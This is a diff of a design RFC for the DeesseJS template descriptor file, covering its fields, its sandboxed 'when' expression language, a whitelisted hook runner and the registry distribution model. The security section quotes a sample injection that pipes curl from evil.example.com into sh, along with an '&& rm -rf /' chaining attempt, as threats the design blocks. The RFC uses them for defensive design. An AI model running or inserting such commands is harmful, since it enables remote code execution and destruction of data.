@@ -19,7 +19,7 @@ description: 'Senior RFC for the deesse-template.json item descriptor. The wire-
 
 ## Summary
 
-This RFC proposes **`deesse-template.json`** — a single-file item descriptor co-located at the root of every template repo (`deessejs/<slug>`). The file declares one item's:
+This RFC proposes **`deesse-template.json`**, a single-file item descriptor co-located at the root of every template repo (`deessejs/<slug>`). The file declares one item's:
 
 - **Identity**: `$schema`, `name`, `title`, `description`, `type`, `version`, `author`, `license`, `category`, `labels`.
 - **Source**: `source = { repo, ref, cloneUrl }` for fetching the item tree.
@@ -49,17 +49,17 @@ The descriptor is fetched from a **static-only CDN** at `registry.deessejs.dev` 
 
 ### Non-Goals
 
-1. **Private registry items behind auth.** Out of scope for this RFC. Private items live on a separate CDN (e.g. `private.registry.deessejs.dev`) gated by the existing `auth.*` oRPC procedures, and require a separate ADR. The public CDN at `registry.deessejs.dev` stays auth-free by design — auth on the public CDN would add operational cost (token validation, rate limiting) without solving a current problem.
+1. **Private registry items behind auth.** Out of scope for this RFC. Private items live on a separate CDN (e.g. `private.registry.deessejs.dev`) gated by the existing `auth.*` oRPC procedures, and require a separate ADR. The public CDN at `registry.deessejs.dev` stays auth-free by design, auth on the public CDN would add operational cost (token validation, rate limiting) without solving a current problem.
 2. **Auto-discovery of namespaces from a `registry.json` at a public repo root.** GitHub rate-limiting (60 req/h unauthenticated) makes this unsafe for the initial release. A follow-up ADR may add it gated on `--discover` opt-in with explicit rate-limit handling (cached `HEAD` requests, ETag revalidation, user-prompted probe).
 3. **Inlining file contents in the registry JSON** (shadcn-style). Our overlays are larger than shadcn components (a blog is a route + a Prisma adapter + a server handler + a UI form), and inlining bloats the descriptor past CDN-friendly size. The descriptor carries **metadata** (paths, transforms, prompts); the file contents live in the template repo's `files/` directory. The CLI fetches a tarball from `registry.deessejs.dev/t/<slug>-<version>.tar.gz` (falling back to shallow `git clone`) and extracts from there (per [RFC-003 §"File acquisition"](./RFC-003-deessejs-add)).
-4. **A `deessejs build` command that compiles TSX sources into `deesse-template.json`** (shadcn-style). The descriptor is JSON, not derived. A future build command is out of scope until a real use case surfaces (multi-style templates, code generation). Adding `deessejs build` would be a second sanctioned exception to [ADR-010 §1](/decisions/ADR-010-cli-public-surface) on top of `add` and the `template` namespace — a third exception would weaken the closed-list invariant.
+4. **A `deessejs build` command that compiles TSX sources into `deesse-template.json`** (shadcn-style). The descriptor is JSON, not derived. A future build command is out of scope until a real use case surfaces (multi-style templates, code generation). Adding `deessejs build` would be a second sanctioned exception to [ADR-010 §1](/decisions/ADR-010-cli-public-surface) on top of `add` and the `template` namespace, a third exception would weaken the closed-list invariant.
 5. **A web UI for non-technical template authors** (`ui.deessejs.dev/create`-style). The author tooling is CLI-only (per [RFC-004](./RFC-004-template-author-tooling)). A web UI is out of scope for this RFC; tracked separately if the team surfaces a need (likely coupled with the PRO namespace, see "Future Possibilities" §B).
 6. **Multi-style templates (one repo ships several variants of the same item).** Today a style is a field on the descriptor (per the closed-list), and a single descriptor declares one style. Multi-style would require either a `style: 'array'` widening or a `deessejs build` pipeline; both are out of scope until a real use case surfaces.
 7. **A `deessejs template manifest` field** that tracks which files each item created (for drift detection). Drift detection exists at re-install time via per-file hash comparison (per [RFC-003 §"Re-install semantics"](./RFC-003-deessejs-add)), but a persistent manifest field is not in this contract. A future ADR may add it; today the lockfile's per-file checksums carry the same information.
 
 ## Motivation
 
-The DeesseJS template registry is the project's identity surface. The user has framed it on the marketing site as a registry that spans "packages, CLI, SaaS multi-tenant, mobile, desktop, AI agent, landing page" — not a single-template repo. Today the registry is a single hand-curated TypeScript array exported from `packages/api/src/templates.ts`:
+The DeesseJS template registry is the project's identity surface. The user has framed it on the marketing site as a registry that spans "packages, CLI, SaaS multi-tenant, mobile, desktop, AI agent, landing page", not a single-template repo. Today the registry is a single hand-curated TypeScript array exported from `packages/api/src/templates.ts`:
 
 ```ts
 export const TEMPLATES: RegistryEntry[] = [
@@ -77,7 +77,7 @@ export const TEMPLATES: RegistryEntry[] = [
 ]
 ```
 
-The wire contract `TemplateV1` carries thirteen flat fields. The CLI consumes the same endpoint and shells out to `git clone --depth 1 --branch <ref>` plus `pnpm/npm install`. There is no manifest reading, no token replacement, no post-processing — the CLI is a glorified clone wrapper. Templates as files live in external GitHub repos; the registry only carries metadata.
+The wire contract `TemplateV1` carries thirteen flat fields. The CLI consumes the same endpoint and shells out to `git clone --depth 1 --branch <ref>` plus `pnpm/npm install`. There is no manifest reading, no token replacement, no post-processing, the CLI is a glorified clone wrapper. Templates as files live in external GitHub repos; the registry only carries metadata.
 
 The flat shape works for a one-template registry. It does not work for the registry the team is building. The structural gaps the user has framed for the multi-template, multi-stack roadmap are documented in detail at [ADR-032 Context](/decisions/ADR-032-deesse-template.json); this RFC does not duplicate the analysis but inherits the load-bearing gaps:
 
@@ -86,7 +86,7 @@ The flat shape works for a one-template registry. It does not work for the regis
 - **No namespaces.** The CLI hardcodes one upstream registry. Every template ships from one org. shadcn's `components.json#registries` map plus the GitHub-static-JSON convention lets the CLI install items from any author without a CLI release; `TemplateV1` has no equivalent.
 - **No transform layer.** The CLI cannot rename `.env.example` to `.env`, interpolate `{{DATABASE_URL}}` from a token map, remove files the user opted out of (e.g. a Storybook setup), or merge `AGENTS.md` fragments contributed by each template.
 
-`deesse-template.json` is the **single response to all four gaps**. It is the file that carries the manifest, the composition map, the namespace metadata, and the transform instructions — all declarative, all in one place, all validated through a published Zod schema.
+`deesse-template.json` is the **single response to all four gaps**. It is the file that carries the manifest, the composition map, the namespace metadata, and the transform instructions, all declarative, all in one place, all validated through a published Zod schema.
 
 ## Detailed Design
 
@@ -96,7 +96,7 @@ The Detailed Design section **does not duplicate [ADR-032](/decisions/ADR-032-de
 
 The descriptor's top-level fields are a **closed list**: `$schema`, `name`, `title`, `description`, `type`, `version`, `author`, `license`, `category`, `labels`, `source`, `requires`, `dependencies`, `devDependencies`, `templateDependencies`, `docs`, `prompts`, `hooks`, `postinstall`, `files`. Two reserved-but-unused fields (`cssVars`, `meta`) are kept for future shadcn-style compatibility. Any top-level field outside this list fails at parse time with `parse_error`.
 
-**Why closed-list.** A closed list prevents typos and schema drift in third-party registries. An author who writes `template.dependancies` (typo) gets a parse error at item-fetch time, before any side effects on disk. A closed list also bounds the CLI's implementation surface — every field has a known type, every field is unit-tested, every field has a place in the JSDoc-on-Zod-schema contract.
+**Why closed-list.** A closed list prevents typos and schema drift in third-party registries. An author who writes `template.dependancies` (typo) gets a parse error at item-fetch time, before any side effects on disk. A closed list also bounds the CLI's implementation surface, every field has a known type, every field is unit-tested, every field has a place in the JSDoc-on-Zod-schema contract.
 
 **Why widen the list is non-breaking.** Adding a new optional field to the closed list is non-breaking because existing CLIs ignore fields they don't know. The wire contract is parsed by Zod with `passthrough` or `.strict()` per the schema's posture; for closed-list fields, the posture is `.strict()` (any unknown field is a parse error), so widening requires a Zod schema version bump and a CLI version bump. The schema lives at `@workspace/contracts/src/v1/template.ts`; the version is the package version.
 
@@ -139,7 +139,7 @@ The `files[]` array uses **placeholder strings** in `target` that resolve agains
 
 `@utils/` is explicitly **not** a reserved placeholder (per shadcn's precedent). An author who needs a `utils` directory uses a literal path (`src/lib/utils.ts`) or declares `aliases.utils` in their `deesse.json`.
 
-**Unknown placeholders fail at item-fetch time** with `parse_error`. The CLI does not silently pass through unknown placeholders — that would let a typo (`@componnts/`) install a file at the wrong path.
+**Unknown placeholders fail at item-fetch time** with `parse_error`. The CLI does not silently pass through unknown placeholders, that would let a typo (`@componnts/`) install a file at the wrong path.
 
 ### The `when` DSL
 
@@ -201,7 +201,7 @@ The descriptor's `hooks = { postInit, postInstall }` and the back-compat `postin
 2. **`shell: false` and tokenised argv.** No `/bin/sh -c`, no command chaining (`&&`, `;`, `|`, backticks, `$()`), no shell-injection. The runner spawns `child_process.spawn(verb, [args], { shell: false })`. **Mathematically prevents command chaining** from a malicious or hand-edited descriptor.
 3. **Substitution priority.** `--pm` flag > `deesse.json#packageManager` > lockfile-detected PM > system PATH. A malicious `{pm}` value cannot be injected because the substitution comes from a closed-list env var, not from user input.
 
-**Threat boundary.** The runner eliminates **manifest command injection** (an item author writing `&& rm -rf /` in their `deesse-template.json#hooks`) but does **not** sandbox downstream package-manager lifecycle scripts. `{pm} install` and `{pm} add <dependency>` execute the npm `preinstall`, `install`, and `postinstall` scripts of every dependency in the registry item's `dependencies[]`. A malicious or compromised dependency runs arbitrary shell code at install time. The CLI does not block this — third-party registries are an explicit trust boundary (per the Future Possibilities §Community support section). The user must opt in to registries they trust (or pass `--ignore-scripts` to npm-family package managers, accepting that native-dependency packages like Prisma and esbuild break).
+**Threat boundary.** The runner eliminates **manifest command injection** (an item author writing `&& rm -rf /` in their `deesse-template.json#hooks`) but does **not** sandbox downstream package-manager lifecycle scripts. `{pm} install` and `{pm} add <dependency>` execute the npm `preinstall`, `install`, and `postinstall` scripts of every dependency in the registry item's `dependencies[]`. A malicious or compromised dependency runs arbitrary shell code at install time. The CLI does not block this, third-party registries are an explicit trust boundary (per the Future Possibilities §Community support section). The user must opt in to registries they trust (or pass `--ignore-scripts` to npm-family package managers, accepting that native-dependency packages like Prisma and esbuild break).
 
 Unit-tested at `apps/cli/test/unit/hooks-runner.test.ts`: one fixture per whitelist entry, one fixture per command-chain attempt (`&&`, `;`, `|`, backticks, `$()`), one fixture per shell-injection attempt.
 
@@ -219,7 +219,7 @@ A **static file host**. No API runtime, no Hono server, no oRPC endpoint behind 
 
 - **JSON Schemas** at `/schema/{project,template}.json`. Generated from the Zod sources in `@workspace/contracts` (via `zod-to-json-schema` or equivalent) by a CI job that runs on every release of that package. Versioned in lockstep with `@workspace/contracts`.
 - **Registry items** at `/r/<slug>.json`. One file per official template, generated by a CI job in `packages/api` from the `TEMPLATES` array in `packages/api/src/templates.ts`. Each item's JSON content is the merged `TemplateV2` shape (registry data + GitHub enrichment, the same shape the oRPC `templates.list` procedure returns today).
-- **Tarballs** at `/t/<slug>-<version>.tar.gz`. Pre-built by the publication CI from the cloned template repo at publish time. The CLI does not rely on `codeload.github.com` for the official registry — that path is the fallback for third-party GitHub sources where the CDN tarball is not available (e.g. `@<host>/<slug>` for a user's own registry).
+- **Tarballs** at `/t/<slug>-<version>.tar.gz`. Pre-built by the publication CI from the cloned template repo at publish time. The CLI does not rely on `codeload.github.com` for the official registry, that path is the fallback for third-party GitHub sources where the CDN tarball is not available (e.g. `@<host>/<slug>` for a user's own registry).
 
 **Why static-only:**
 
@@ -233,7 +233,7 @@ A **static file host**. No API runtime, no Hono server, no oRPC endpoint behind 
 - Third-party registries (`@community/...`, `@<host>/...`): plain `fetch` over HTTPS against the user-declared host.
 - `list`, `info`, `auth.*`, version probe: typed oRPC client against `app.deessejs.com`.
 
-This requires an amendment to [ADR-001](/decisions/ADR-001-orpc-is-load-bearing) §"What this rule forbids" to carve out an explicit exception for plain-HTTPS `fetch` against (a) the registry CDN and (b) third-party registry hosts. ADR-001's load-bearing rule — "no parallel REST envelope for the internal API" — stays intact; the amendment is a scope clarification, not a relaxation. Tracked by [issue #139](https://github.com/deessejs/deessejs/issues/139).
+This requires an amendment to [ADR-001](/decisions/ADR-001-orpc-is-load-bearing) §"What this rule forbids" to carve out an explicit exception for plain-HTTPS `fetch` against (a) the registry CDN and (b) third-party registry hosts. ADR-001's load-bearing rule, "no parallel REST envelope for the internal API", stays intact; the amendment is a scope clarification, not a relaxation. Tracked by [issue #139](https://github.com/deessejs/deessejs/issues/139).
 
 **Provisioning checklist:** one CNAME, one TLS cert, one Vercel project named `registry-deessejs-dev` (root: `packages/api/public/`), one GitHub Actions workflow per publication source.
 
@@ -269,7 +269,7 @@ Source: [ADR-032 "Why not the alternatives" #3](/decisions/ADR-032-deesse-templa
 
 What it is: A new top-level CLI verb `deessejs embed <slug-or-url>` for "sub-templates" (items that claim a sub-tree of the project).
 
-Why we rejected it: The user explicitly framed a blog as a feature: *"It's a complete feature, which may need to add routes, schemas, pages, components, etc."* — i.e., a blog is a feature, just bigger than auth. The conceptual distinction between "feature overlay" and "sub-template" is artificial at this level. The existing `add` command with the `template:package` discriminator handles the blog case.
+Why we rejected it: The user explicitly framed a blog as a feature: *"It's a complete feature, which may need to add routes, schemas, pages, components, etc."*, i.e., a blog is a feature, just bigger than auth. The conceptual distinction between "feature overlay" and "sub-template" is artificial at this level. The existing `add` command with the `template:package` discriminator handles the blog case.
 
 A future `scope: "subtree"` field on `TemplateV2` is allowed (additive, optional, default `"overlay"`) if a real use case surfaces where a feature needs to claim a sub-tree opaque to other features.
 
@@ -281,11 +281,11 @@ Source: [ADR-035](/decisions/ADR-035-feature-not-subtree).
 
 **The `when` DSL is sandboxed.** A third-party registry item could ship `when: "1; require('child_process').exec('curl evil.example.com | sh'); 1"` and trick a naive `eval`-based interpreter into executing arbitrary code at install time. The tree-walking AST interpreter in `apps/cli/src/prompts/when.ts` closes that hole: the parser refuses the input as a syntax error before evaluation ever happens. Unit-tested in `apps/cli/test/unit/when.test.ts` (one fixture per sandboxed-escape attempt: `eval`, `Function`, `process`, `require`, `globalThis`, `__proto__`, `this`).
 
-**`when` evaluation context.** The DSL is evaluated against a two-scope context (`answers`, `project`) — no access to `process`, `require`, `fs`, or any Node.js primitive. Bare identifiers resolve against `answers` first, then `project`. See the "Detailed Design" §"The `when` DSL" above for the context shape.
+**`when` evaluation context.** The DSL is evaluated against a two-scope context (`answers`, `project`), no access to `process`, `require`, `fs`, or any Node.js primitive. Bare identifiers resolve against `answers` first, then `project`. See the "Detailed Design" §"The `when` DSL" above for the context shape.
 
 **Hooks are spawned with `shell: false` and tokenised argv.** No `/bin/sh -c`, no command chaining, no shell-injection. The whitelist (`apps/cli/src/hooks/whitelist.ts`) is a closed list; verbs not on it fail at item-fetch time with `parse_error`. Unit-tested in `apps/cli/test/unit/hooks-runner.test.ts`.
 
-**Threat boundary.** The runner eliminates **manifest command injection** (an item author writing `&& rm -rf /` in their `deesse-template.json#hooks`) but does **not** sandbox downstream package-manager lifecycle scripts. `{pm} install` and `{pm} add <dependency>` execute the npm `preinstall`, `install`, and `postinstall` scripts of every dependency in the registry item's `dependencies[]`. A malicious or compromised dependency runs arbitrary shell code at install time. The CLI does not block this — third-party registries are an explicit trust boundary (per Future Possibilities §Community support). The user must opt in to registries they trust (or pass `--ignore-scripts` to npm-family package managers, accepting that native-dependency packages like Prisma and esbuild break). The full trust model is documented at `docs/security/cli-trust-model.md` (to be written).
+**Threat boundary.** The runner eliminates **manifest command injection** (an item author writing `&& rm -rf /` in their `deesse-template.json#hooks`) but does **not** sandbox downstream package-manager lifecycle scripts. `{pm} install` and `{pm} add <dependency>` execute the npm `preinstall`, `install`, and `postinstall` scripts of every dependency in the registry item's `dependencies[]`. A malicious or compromised dependency runs arbitrary shell code at install time. The CLI does not block this, third-party registries are an explicit trust boundary (per Future Possibilities §Community support). The user must opt in to registries they trust (or pass `--ignore-scripts` to npm-family package managers, accepting that native-dependency packages like Prisma and esbuild break). The full trust model is documented at `docs/security/cli-trust-model.md` (to be written).
 
 **The Zod schema is the validator of last resort.** A malformed item from any registry (official or third-party) fails at parse time with `parse_error` before any side effects on disk. The CLI does not write any file before the descriptor is validated.
 
@@ -321,9 +321,9 @@ The implementation lives at `apps/cli/src/transforms/extract.ts`. Unit tests in 
 
 The `files[]` transform verbs (`rename`, `interpolate`, `remove`, `merge`) have well-defined scopes. Three are deterministic and safe:
 
-- **`rename`** — copies the source file at `path` to `target` without modification. No AST, no parsing.
-- **`interpolate`** — reads `path` as a template (with `{{KEY}}` placeholders) and writes the rendered content to `target`. The placeholders are substituted from `deesse.json#tokens` (set via `consumes: { target: "tokens:<KEY>" }` or hand-edited by the user). No AST, no parsing.
-- **`remove`** — does not copy a file; removes files in the cloned tree at the resolved `target` path. Used for `with_*` toggles.
+- **`rename`**, copies the source file at `path` to `target` without modification. No AST, no parsing.
+- **`interpolate`**, reads `path` as a template (with `{{KEY}}` placeholders) and writes the rendered content to `target`. The placeholders are substituted from `deesse.json#tokens` (set via `consumes: { target: "tokens:<KEY>" }` or hand-edited by the user). No AST, no parsing.
+- **`remove`**, does not copy a file; removes files in the cloned tree at the resolved `target` path. Used for `with_*` toggles.
 
 The fourth, **`merge`**, is restricted to specific target types:
 
@@ -372,7 +372,7 @@ One design call surfaces during review and remains open in this version of the R
 
 **Resolved: `{pm}`-parameterised, ten entries.** Whitelist at `apps/cli/src/hooks/whitelist.ts`: `["{pm} install", "{pm} add", "{pm} remove", "{pm} db:push", "{pm} db:migrate", "{pm} db:generate", "{pm} generate", "{pm} format", "{pm} typecheck", "git init"]`. Portable across `pnpm`, `npm`, `yarn`, `bun`. Covers `prisma generate`, `drizzle-kit push` (via `db:generate`), and the common cases. Adding a verb is an internal change (not a new public error code, not a new flag), but the change must keep the `git init` carve-out and the `{pm}`-parameterised shape.
 
-The earlier Q1 (when to ship `deessejs add` — with this RFC or as a follow-up) was resolved as **follow-up**; the answer lives in [RFC-003 §"Open Questions"](./RFC-003-deessejs-add). The earlier Q3 (namespace auto-discovery — initial release or follow-up) was resolved as **explicit map now, auto-discovery in a follow-up ADR**; the answer lives in [ADR-032 Open Question #4](/decisions/ADR-032-deesse-template.json).
+The earlier Q1 (when to ship `deessejs add`, with this RFC or as a follow-up) was resolved as **follow-up**; the answer lives in [RFC-003 §"Open Questions"](./RFC-003-deessejs-add). The earlier Q3 (namespace auto-discovery, initial release or follow-up) was resolved as **explicit map now, auto-discovery in a follow-up ADR**; the answer lives in [ADR-032 Open Question #4](/decisions/ADR-032-deesse-template.json).
 
 Tracked by [ADR-032 Consequences §"postinstall whitelist"](/decisions/ADR-032-deesse-template.json).
 
@@ -383,7 +383,7 @@ Tracked by [ADR-032 Consequences §"postinstall whitelist"](/decisions/ADR-032-d
 The closest analogue to this design. shadcn's `registry-item.json` is the inspiration for `deesse-template.json`. The divergences:
 
 - shadcn inlines file contents in the registry JSON (`files[].content`); DeesseJS uses a clone-into-tmp approach because our overlays are larger (a blog is a route + a Prisma adapter + a server handler + a UI form).
-- shadcn has a `components.json` for project config; DeesseJS has `deesse.json` (same role — see [RFC-001](./RFC-001-deesse-json)).
+- shadcn has a `components.json` for project config; DeesseJS has `deesse.json` (same role, see [RFC-001](./RFC-001-deesse-json)).
 - shadcn has no formal `consumes[]` convention; we add it because the user-facing surface (`project:database`, `tokens:<KEY>`) needs explicit routing for non-trivial items.
 
 Sources: [shadcn registry getting started](https://ui.shadcn.com/docs/registry/getting-started), [shadcn `registry-item.json` schema](https://ui.shadcn.com/docs/registry/registry-item-json), [shadcn `components.json` schema](https://ui.shadcn.com/docs/components-json).
@@ -447,7 +447,7 @@ The `@deessejs-community/...` tier is **mandatory-reviewed**: an author cannot s
 }
 ```
 
-The CLI's verification is **opt-in** (per `--verify-provenance` flag, default off to keep the initial install flow simple). When on, the CLI fetches the Sigstore bundle, verifies the signature against the Fulcio root, checks the inclusion promise against the rekor log, and asserts the `commit_sha` matches the `source.ref` in the descriptor. A failed verification emits a loud warning but does **not** block the install (per the npm pattern — provenance is informational, not gating). Future versions may make verification default-on for `@deessejs-community` items.
+The CLI's verification is **opt-in** (per `--verify-provenance` flag, default off to keep the initial install flow simple). When on, the CLI fetches the Sigstore bundle, verifies the signature against the Fulcio root, checks the inclusion promise against the rekor log, and asserts the `commit_sha` matches the `source.ref` in the descriptor. A failed verification emits a loud warning but does **not** block the install (per the npm pattern, provenance is informational, not gating). Future versions may make verification default-on for `@deessejs-community` items.
 
 **Distribution model.** Each author maintains their own GitHub repo (this contract requires `deesse-template.json` at the root). The author's CI publishes a tarball to their own host (or uses GitHub's `codeload` archive endpoint as a default). The user's `deesse.json#registries` entry points at the author's host URL. There is no centralised registry repo that authors must PR against (except for `@deessejs-community` items, which go through `deessejs/community-registry`).
 
@@ -463,42 +463,42 @@ Continue? [y/N]
 
 **Future considerations** (out of scope for this RFC, may land in follow-up ADRs):
 
-- **`deessejs community submit`** — a CLI command that scaffolds a PR against `deessejs/community-registry` from a local `deesse-template.json` (analogous to `npm publish` but submitting to a curated namespace).
-- **Reviewer rotation** — a documented process for assigning `@deessejs-community` PRs to maintainers, with a turnaround SLA.
-- **Sign-and-publish OIDC** — the author's CI uses Sigstore's OIDC signing against GitHub Actions to attest the `commit_sha` automatically; the provenance field is auto-populated by the CI, not hand-written.
-- **Per-tier search UX** — the gallery (`apps/web/src/app/(product)/templates/`) filters by namespace tier with distinct badges ("Official", "Community", "Verified").
-- **De-publication** — a tier-aware de-publication flow (an item removed from `@deessejs-community` becomes `@<host>/...` on the author's own registry; an item removed from `@deessejs/` is gone everywhere).
-- **Anti-impersonation** — a `deessejs template validate --strict` check that verifies the `source.repo` matches the GitHub org whose OIDC token signed the provenance (catches typosquats like `@deessejs-community/saas-startr`).
+- **`deessejs community submit`**, a CLI command that scaffolds a PR against `deessejs/community-registry` from a local `deesse-template.json` (analogous to `npm publish` but submitting to a curated namespace).
+- **Reviewer rotation**, a documented process for assigning `@deessejs-community` PRs to maintainers, with a turnaround SLA.
+- **Sign-and-publish OIDC**, the author's CI uses Sigstore's OIDC signing against GitHub Actions to attest the `commit_sha` automatically; the provenance field is auto-populated by the CI, not hand-written.
+- **Per-tier search UX**, the gallery (`apps/web/src/app/(product)/templates/`) filters by namespace tier with distinct badges ("Official", "Community", "Verified").
+- **De-publication**, a tier-aware de-publication flow (an item removed from `@deessejs-community` becomes `@<host>/...` on the author's own registry; an item removed from `@deessejs/` is gone everywhere).
+- **Anti-impersonation**, a `deessejs template validate --strict` check that verifies the `source.repo` matches the GitHub org whose OIDC token signed the provenance (catches typosquats like `@deessejs-community/saas-startr`).
 
 ## Cross-references
 
 ### Atomic decisions (ADRs)
 
-- **[ADR-032: deesse-template.json](/decisions/ADR-032-deesse-template.json)** — the **load-bearing spec**. The Field reference section is the authoritative source for every field's type, constraints, examples, and anti-patterns. This RFC is the senior narrative; ADR-032 is the contract.
+- **[ADR-032: deesse-template.json](/decisions/ADR-032-deesse-template.json)**, the **load-bearing spec**. The Field reference section is the authoritative source for every field's type, constraints, examples, and anti-patterns. This RFC is the senior narrative; ADR-032 is the contract.
 
 ### Companion documents
 
-- **[RFC-001: The DeesseJS Project Config](./RFC-001-deesse-json)** — the consumer-side RFC for `deesse.json` + `deesse.lock`. The descriptor's `consumes[]` rules and the placeholders (`@components/`, `~/`, etc.) resolve against `deesse.json#paths` and `deesse.json#aliases`.
-- **[RFC-003: The DeesseJS Overlay Command](./RFC-003-deessejs-add)** — the consumer-side RFC for `deessejs add`. The descriptor is fetched, validated, and applied by `add`; the type-discriminator enforcement is implemented there.
-- **[RFC-004: The DeesseJS Author Tooling](./RFC-004-template-author-tooling)** — the author-side RFC for `deessejs template <validate | new | explain>`. The descriptor is written and validated by these subcommands.
+- **[RFC-001: The DeesseJS Project Config](./RFC-001-deesse-json)**, the consumer-side RFC for `deesse.json` + `deesse.lock`. The descriptor's `consumes[]` rules and the placeholders (`@components/`, `~/`, etc.) resolve against `deesse.json#paths` and `deesse.json#aliases`.
+- **[RFC-003: The DeesseJS Overlay Command](./RFC-003-deessejs-add)**, the consumer-side RFC for `deessejs add`. The descriptor is fetched, validated, and applied by `add`; the type-discriminator enforcement is implemented there.
+- **[RFC-004: The DeesseJS Author Tooling](./RFC-004-template-author-tooling)**, the author-side RFC for `deessejs template <validate | new | explain>`. The descriptor is written and validated by these subcommands.
 
 ### Companion ADRs (load-bearing rules)
 
-- **[ADR-001: oRPC is load-bearing](/decisions/ADR-001-orpc-is-load-bearing)** — amended by [issue #139](https://github.com/deessejs/deessejs/issues/139) for plain-HTTPS `fetch` against the registry CDN and third-party registries. The descriptor lives on the static CDN (plain `fetch`); the dynamic API (`templates.list`, `auth.*`, version probe) stays on oRPC.
-- **[ADR-010: CLI public surface](/decisions/ADR-010-cli-public-surface)** — the invariants that fence the CLI's published surface. This RFC scopes the descriptor; the CLI surface changes are documented in RFC-003 and RFC-004.
+- **[ADR-001: oRPC is load-bearing](/decisions/ADR-001-orpc-is-load-bearing)**, amended by [issue #139](https://github.com/deessejs/deessejs/issues/139) for plain-HTTPS `fetch` against the registry CDN and third-party registries. The descriptor lives on the static CDN (plain `fetch`); the dynamic API (`templates.list`, `auth.*`, version probe) stays on oRPC.
+- **[ADR-010: CLI public surface](/decisions/ADR-010-cli-public-surface)**, the invariants that fence the CLI's published surface. This RFC scopes the descriptor; the CLI surface changes are documented in RFC-003 and RFC-004.
 
 ### Plans and memory
 
-- **`docs/engineering/plans/saas-template-divergence.md`** — the divergence plan explaining why the current registry lives in `packages/api/src/templates.ts` rather than in a separate `deessejs/registry-data` repo.
-- **`docs/engineering/plans/robust-shared-backend.md`** — the plan that pins the CLI disk cache at `~/.deessejs/templates.json` with ETag-driven revalidation. The cache extends to `~/.deessejs/template-items/<slug>.json`.
-- **`.claude/agent-memory/tech-lead/project/templates-content-not-cli.md`** — the load-bearing governance rule. Adding a row to a registry repo is content, never a CLI change.
-- **`.claude/agent-memory/tech-lead/project/template-strategy.md`** — the companion memory that frames the registry as a multi-stack, multi-target surface.
-- **`apps/cli/CHANGELOG.md`** — the historical record of CLI surface changes.
+- **`docs/engineering/plans/saas-template-divergence.md`**, the divergence plan explaining why the current registry lives in `packages/api/src/templates.ts` rather than in a separate `deessejs/registry-data` repo.
+- **`docs/engineering/plans/robust-shared-backend.md`**, the plan that pins the CLI disk cache at `~/.deessejs/templates.json` with ETag-driven revalidation. The cache extends to `~/.deessejs/template-items/<slug>.json`.
+- **`.claude/agent-memory/tech-lead/project/templates-content-not-cli.md`**, the load-bearing governance rule. Adding a row to a registry repo is content, never a CLI change.
+- **`.claude/agent-memory/tech-lead/project/template-strategy.md`**, the companion memory that frames the registry as a multi-stack, multi-target surface.
+- **`apps/cli/CHANGELOG.md`**, the historical record of CLI surface changes.
 
 ## Related
 
-- [RFCs index](/rfcs) — the convention for RFCs in this directory.
-- [ADRs index](/decisions) — the atomic decisions that implement this RFC.
+- [RFCs index](/rfcs), the convention for RFCs in this directory.
+- [ADRs index](/decisions), the atomic decisions that implement this RFC.
 - [Spotify Engineering: When Should I Write an ADR](https://engineering.atspotify.com/2020/04/when-should-i-write-an-architecture-decision-record)
 - [Google design docs guide](https://developers.google.com/tech-writing/design_docs)
 - [Stripe engineering document templates](https://stripe.com/blog/engineering/document-templates)
